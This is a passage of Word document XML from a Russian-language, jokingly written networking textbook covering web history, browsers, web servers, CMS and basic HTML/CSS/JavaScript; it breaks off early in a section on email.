          <w:b/>
        </w:rPr>
        <w:t>сервисы Internet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (WWW, email, FTP, облачные сервисы) — то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> конкретно делают эти протоколы для пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">А пока — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>поздравляю, чувак</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">! Ты разобрался в TCP, UDP, портах и HTTP. Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>основа основ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сетевых технологий. Теперь можешь пойти и рассказать друзьям, почему их CS:GO лагает (спойлер: потому что пакеты теряются, а UDP не умеет их пересылать). 🎉🚀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.5. Сервисы Internet</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Протоколы — это круто, но что с ними делать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, братан, в прошлых главах мы разобрали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работает интернет: IP-адреса, DNS, TCP/UDP, HTTP/HTTPS. Это всё прекрасно, но вот вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нахрена</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> всё это нужно обычному человеку? Чувак не хочет знать про TCP-рукопожатия — он хочет залипнуть в ютубчик, почекать мемчики в телеге или погамать в CS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сервисы Internet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> конкретно делают все эти протоколы для пользователей. Это веб-сайты, почта, облачные диски, стримы, игры — всё то, ради чего мы вообще подключаемся к интернету.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.01 (Адресация)** — DNS превращает `google.com` в IP-адрес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.04 (Протоколы)** — HTTP/HTTPS, SMTP, FTP, UDP — всё это используется сервисами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптография)** — шифрование в мессенджерах, HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.05 (Атаки)** — фишинг через email, DDoS на веб-серверы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.1. WWW (World Wide Web): паутина из сайтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WWW (World Wide Web)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>глобальная система гипертекстовых документов</w:t>
      </w:r>
      <w:r>
        <w:t>, связанных гиперссылками. Короче, это все сайты, которые ты открываешь в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>История: как появился веб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1989 год</w:t>
      </w:r>
      <w:r>
        <w:t>: Тим Бернерс-Ли (учёный в CERN) придумал:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTML** (язык разметки для веб-страниц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP** (протокол передачи HTML)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**URL** (адреса веб-страниц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Первый **браузер** (WorldWideWeb) и **веб-сервер**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1991 год</w:t>
      </w:r>
      <w:r>
        <w:t>: Первый публичный веб-сайт: `http://info.cern.ch/`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1993 год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Браузер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Mosaic</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (первый с картинками)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1995-2000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Эра </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>веб 1.0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (статичные страницы, никакого взаимодействия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2000-2010</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Эра </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>веб 2.0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (динамические сайты, социальные сети, YouTube, блоги)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2010-...</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Эра </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>веб 3.0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ИИ, блокчейн, децентрализация... ну, пока больше хайпа, чем реальной пользы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает веб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс загрузки веб-страницы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ты вводишь** `https://example.com` в браузер</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS** превращает `example.com` в IP-адрес (`93.184.216.34`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**TCP-соединение** с сервером (порт 443 для HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**TLS handshake** (установка шифрованного канала)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTP-запрос**: `GET / HTTP/1.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер отвечает** HTML-кодом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузер парсит** HTML, загружает CSS, JS, картинки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Страница отображается** на экране</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время загрузки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (типичное): 1-3 секунды (зависит от RTT, размера страницы, скорости сервера).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Браузеры: окна в веб</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Браузер (browser)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа для просмотра веб-страниц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные браузеры (2025)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Браузер | Движок рендеринга | Доля рынка | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|-------------------|-----------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Chrome</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Blink (Chromium) | ~65% | Быстрый, но жрёт RAM как не в себя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Safari</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | WebKit | ~20% | Для macOS/iOS, энергоэффективный |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Gecko | ~3% | Open-source, защита приватности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Edge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Blink (Chromium) | ~5% | Windows-интеграция, мемогенератор |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Opera</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Blink (Chromium) | ~2% | Встроенный VPN, блокировка рекламы |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Chrome может жрать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1-2 ГБ RAM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на 10 вкладок. Почему? Каждая вкладка — это отдельный процесс (для безопасности и стабильности).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Веб-серверы: кто отдаёт страницы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Веб-сервер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа, которая слушает порт 80/443 и отдаёт веб-страницы по HTTP/HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные веб-серверы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервер | Доля рынка | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-----------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~34% | Быстрый, асинхронный, лёгкий (используется для высоконагруженных сайтов) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~31% | Старый, надёжный, модульный (работает с 1995 года) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cloudflare</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~20% | CDN + защита от DDoS |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LiteSpeed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~5% | Коммерческий, очень быстрый |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IIS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~5% | Microsoft, для Windows Server |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nginx vs Apache</w:t>
      </w:r>
      <w:r>
        <w:t>: Nginx быстрее для статики (картинки, CSS, JS), Apache лучше для динамики (PHP, Python).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Статические vs Динамические сайты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статический сайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — HTML-файлы лежат на диске, сервер просто отдаёт их как есть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Лендинги (одностраничники)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Портфолио</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Документация (GitHub Pages)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: быстрые, простые, дешёвые (хостинг за $1/месяц).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>: нет интерактивности (нельзя логиниться, оставлять комментарии).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамический сайт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — HTML генерируется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>на лету</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сервером (PHP, Python, Node.js).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Социальные сети (VK, Facebook)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интернет-магазины (Amazon, Ozon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Форумы (Reddit)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: интерактивность, персонализация (каждый пользователь видит своё).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>: медленнее, нужен сервер с бэкендом и БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CMS (Content Management Systems) — конструкторы сайтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CMS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это система управления контентом (админка для сайта без программирования).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные CMS</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| CMS | Доля рынка | Язык | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|-----------|------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WordPress</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~43% всех сайтов | PHP | Блоги, интернет-магазины (WooCommerce), куча плагинов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Joomla</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~3% | PHP | Сложнее WordPress, но гибче |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Drupal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2% | PHP | Для крупных корпоративных сайтов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Shopify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~5% | Ruby | Интернет-магазины (SaaS) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Wix / Squarespace</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~3% | Закрытые | Конструкторы для чайников (drag-and-drop) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>43% всех сайтов в мире</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работают на WordPress (включая сайты Disney, Sony, Forbes).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>HTML, CSS, JavaScript — святая троица веба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HTML (HyperText Markup Language)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — структура страницы (заголовки, параграфы, картинки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;h1&gt;Привет, мир!&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t>&lt;p&gt;Это параграф.&lt;/p&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src="cat.jpg" alt="Котик"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CSS (Cascading Style Sheets)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — оформление (цвета, шрифты, расположение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>h1 { color: red; font-size: 32px; }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — интерактивность (кнопки, анимации, AJAX-запросы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>document.getElementById("button").onclick = function() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  alert("Нажал!");</w:t>
        <w:br/>
        <w:t>};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мем</w:t>
      </w:r>
      <w:r>
        <w:t>: "JavaScript — это не Java, как hamster — это не ham." 🐹🍖</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.2. Электронная почта (Email): ветеран интернета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Email</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это служба отправки электронных писем. Старейший сервис интернета (старше веба!).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>История email</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1971 год</w:t>
      </w:r>
      <w:r>
        <w:t>: Рэй Томлинсон (Ray Tomlinson) отправил первое email-сообщение. Придумал формат `user@host`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1982 год</w:t>
      </w:r>
      <w:r>
        <w:t>: SMTP (протокол отправки почты).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1990-е</w:t>
      </w:r>
      <w:r>
        <w:t>: Взрыв популярности (Hotmail, Yahoo Mail, AOL).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2004 год</w:t>
      </w:r>
      <w:r>
        <w:t>: Gmail от Google (1 ГБ бесплатного места — тогда это было невероятно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сейчас</w:t>
      </w:r>
      <w:r>
        <w:t>: 4+ миллиарда пользователей email. Но молодёжь почти не юзает — все в мессенджерах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура email-адреса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат</w:t>
      </w:r>
      <w:r>
        <w:t>: `user@domain.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**user** — имя пользователя (может содержать точки, цифры, дефисы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**@** — символ "собака" (at)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**domain.com** — доменное имя почтового сервера</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
